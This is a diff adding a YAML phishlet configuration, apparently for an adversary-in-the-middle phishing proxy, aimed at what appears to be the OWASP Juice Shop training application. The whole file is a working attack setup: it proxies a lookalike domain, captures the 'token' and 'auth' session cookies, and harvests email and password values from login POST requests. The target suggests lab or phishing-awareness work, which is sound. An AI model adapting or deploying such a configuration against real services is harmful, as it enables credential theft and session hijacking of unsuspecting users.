@@ -1,0 +1,21 @@
+name: 'JuiceShopPhishlet'
+author: 'YourName'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'shop', orig_sub: 'www', domain: 'your-custom-domain.com', session: true, is_landing: true}
+auth_tokens:
+  - domain: 'your-custom-domain.com'
+    keys: ['token', 'auth']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'shop.your-custom-domain.com'
+  path: '/#login'
